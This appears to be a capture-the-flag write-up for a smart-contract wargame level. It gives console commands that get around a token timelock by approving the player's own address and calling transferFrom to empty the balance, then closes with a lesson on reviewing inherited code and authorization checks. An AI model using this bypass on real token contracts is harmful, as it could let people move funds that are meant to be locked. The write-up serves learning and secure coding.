Solution
========

1. Get you balance with ```(await contract.balanceOf(player)).toString()``` --> '1000000000000000000000000'
2. Approve tokens to be spent with ```await contract.approve(player, BigInt('1000000000000000000000000'))```
3. Fund a secondary account of your Metamask wallet with some ETH
4. ```await contract.transferFrom(player, 'SECONDARY_ACCOUNT_ADDRESS' ,BigInt('1000000000000000000000000'))```
5. ```(await contract.balanceOf(player)).toString()``` --> '0' --> SOLVED

Conclusion
==========
When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that ```transfer``` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.